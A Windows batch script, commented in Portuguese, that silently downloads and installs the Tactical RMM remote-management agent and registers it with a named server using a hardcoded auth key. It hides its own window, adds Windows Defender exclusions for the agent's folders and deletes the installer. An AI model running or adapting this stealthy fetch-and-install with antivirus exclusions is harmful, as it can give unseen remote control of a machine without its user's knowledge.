@echo off
:: Oculta a execução do CMD
if not "%1"=="h" (
    start /min cmd.exe /c %0 h
    exit
)

setlocal

:: Configurações
set "innosetup=tacticalagent-v2.8.0-windows-amd64.exe"
set "api=https://api.atendepj.com"
set "clientid=1"
set "siteid=1"
set "agenttype=server"
set "auth=93dac48f2f2c4399bf9ad6c33cff2407062a5b5c6568ced9d57239dca1c1a6d1"
set "downloadlink=https://github.com/amidaware/rmmagent/releases/download/v2.8.0/tacticalagent-v2.8.0-windows-amd64.exe"
set "OutPath=%TEMP%"
set "output=%OutPath%\%innosetup%"

:: Configurações do Windows Defender (Executado silenciosamente)
powershell -WindowStyle Hidden -Command "& {Try { $DefenderStatus = Get-MpComputerStatus | Select-Object -ExpandProperty AntivirusEnabled; If ($DefenderStatus -eq $true) { Add-MpPreference -ExclusionPath 'C:\Program Files\TacticalAgent\*'; Add-MpPreference -ExclusionPath 'C:\ProgramData\TacticalRMM\*' } } Catch {}}"

:: Testar conexão com o servidor (Silencioso)
set "host=github.com"
set /a X=0
:TEST_CONNECTION
ping -n 1 %host% >nul 2>&1
if %errorlevel%==0 goto DOWNLOAD
set /a X+=1
if %X% LSS 3 goto TEST_CONNECTION
exit /b 1

:DOWNLOAD
:: Baixa o instalador (Silencioso)
powershell -WindowStyle Hidden -Command "& {Invoke-WebRequest -Uri '%downloadlink%' -OutFile '%output%'}"

:: Instala o software (100% oculto)
start /min /b "" "%output%" /VERYSILENT /SUPPRESSMSGBOXES

:: Aguarda alguns segundos (Sem interface)
timeout /t 5 /nobreak >nul

:: Executa o TacticalAgent (100% oculto)
start /min /b "" "C:\Program Files\TacticalAgent\tacticalrmm.exe" -m install --api "%api%" --client-id %clientid% --site-id %siteid% --agent-type "%agenttype%" --auth "%auth%"

:: Remove o instalador
del "%output%" >nul 2>&1

exit /b 0
